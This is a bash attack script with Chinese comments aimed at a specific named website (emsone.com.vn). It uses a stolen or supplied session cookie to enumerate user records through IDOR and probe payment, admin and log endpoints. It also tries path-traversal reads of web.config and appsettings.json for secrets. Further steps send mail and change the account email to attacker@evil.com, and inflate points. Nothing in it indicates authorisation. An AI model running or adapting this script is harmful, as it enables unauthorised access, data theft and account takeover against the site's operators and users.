#!/bin/bash
# emsone.com.vn 登录后快速利用脚本
# 红队专家级 - 直接利用

TARGET="https://emsone.com.vn"
SESSION_COOKIE="$1"  # 传入有效的ASP.NET_SessionId

if [ -z "$SESSION_COOKIE" ]; then
    echo "用法: $0 <ASP.NET_SessionId>"
    exit 1
fi

COOKIE="ASP.NET_SessionId=$SESSION_COOKIE"

echo "[+] 开始认证后攻击面测试..."
echo ""

# === IDOR测试 ===
echo "[1] IDOR水平越权测试"
for id in {1..100}; do
    RESPONSE=$(curl -s "$TARGET/api/user/$id" \
        -H "Cookie: $COOKIE" \
        --http2)
    if echo "$RESPONSE" | grep -qi "email\|phone\|name"; then
        echo "[!] IDOR漏洞 - 用户ID: $id"
        echo "$RESPONSE" | head -5
    fi
done

# === 敏感数据访问 ===
echo ""
echo "[2] 敏感数据访问测试"
ENDPOINTS=(
    "/api/orders"
    "/api/payment/cards"
    "/api/user/profile"
    "/api/admin/users"
    "/api/stats/dashboard"
    "/api/logs"
)

for endpoint in "${ENDPOINTS[@]}"; do
    RESPONSE=$(curl -s "$TARGET$endpoint" \
        -H "Cookie: $COOKIE" \
        --http2)
    if [ ${#RESPONSE} -gt 100 ]; then
        echo "[!] 可访问: $endpoint (${#RESPONSE} bytes)"
    fi
done

# === 文件读取 ===
echo ""
echo "[3] 任意文件读取测试"
FILES=(
    "../../../web.config"
    "../../../appsettings.json"
    "../../../app.config"
    "../../../Global.asax"
    "../../../bin/config.dll"
)

for file in "${FILES[@]}"; do
    RESPONSE=$(curl -s "$TARGET/api/file/view?path=$file" \
        -H "Cookie: $COOKIE" \
        --http2)
    if echo "$RESPONSE" | grep -qi "connectionString\|password\|secret"; then
        echo "[!] 配置文件泄露: $file"
        echo "$RESPONSE" | head -10
    fi
done

# === 权限绕过 ===
echo ""
echo "[4] 权限绕过测试"
ADMIN_ENDPOINTS=(
    "/api/admin/users"
    "/api/admin/config"
    "/api/admin/logs"
    "/admin/dashboard"
    "/admin/users"
)

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$endpoint" \
        -H "Cookie: $COOKIE" \
        --http2)
    if [ "$STATUS" != "403" ] && [ "$STATUS" != "401" ]; then
        echo "[!] 权限绕过: $endpoint (HTTP $STATUS)"
    fi
done

# === 功能滥用 ===
echo ""
echo "[5] 功能滥用测试"
# 邮件发送
curl -s -X POST "$TARGET/api/mail/send" \
    -H "Cookie: $COOKIE" \
    -d "to=test@evil.com&subject=Test&body=Test" \
    --http2 | grep -q "success\|200" && \
    echo "[!] 邮件发送功能可滥用"

# 文件上传
curl -s -X POST "$TARGET/api/file/upload" \
    -H "Cookie: $COOKIE" \
    -F "file=@test.txt" \
    --http2 | grep -q "success\|200" && \
    echo "[!] 文件上传功能可用"

# === 业务逻辑 ===
echo ""
echo "[6] 业务逻辑漏洞测试"
# 修改邮箱
curl -s -X POST "$TARGET/api/user/change-email" \
    -H "Cookie: $COOKIE" \
    -d "email=attacker@evil.com" \
    --http2 | grep -q "success\|200" && \
    echo "[!] 邮箱修改未验证"

# 积分修改
curl -s -X POST "$TARGET/api/points/add" \
    -H "Cookie: $COOKIE" \
    -d "points=999999" \
    --http2 | grep -q "success\|200" && \
    echo "[!] 积分可随意修改"

echo ""
echo "[+] 测试完成"
